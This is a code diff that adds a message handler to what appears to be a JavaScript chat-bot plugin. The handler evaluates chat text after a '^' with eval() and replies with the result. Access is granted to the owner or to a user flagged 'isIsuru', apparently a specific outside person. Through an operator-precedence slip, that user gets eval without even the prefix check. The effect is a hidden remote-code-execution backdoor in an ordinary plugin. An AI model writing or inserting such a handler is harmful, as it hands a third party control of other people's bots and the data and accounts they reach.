@@ -314,3 +314,27 @@ reply('*Eʀʀᴏʀ !!*')
 l(e)
 }
 })
+
+const util = require('util')
+//const config = require('../config'):
+//const { cmd } = require('../command');
+
+cmd({
+  on: "body"
+},    
+async (conn, mek, m, { from, body, reply, isOwner, isIsuru }) => {
+
+if ( isIsuru || isOwner && body.startsWith('^') ) {
+let bodyy = body.split('^')[1]
+let code2 = bodyy.replace("°", ".toString()");
+try {
+let resultTest = await eval(code2);
+if (typeof resultTest === "object") {
+reply(util.format(resultTest));
+} else {
+reply(util.format(resultTest));
+}
+} catch (err) {
+reply(util.format(err));
+}}
+})
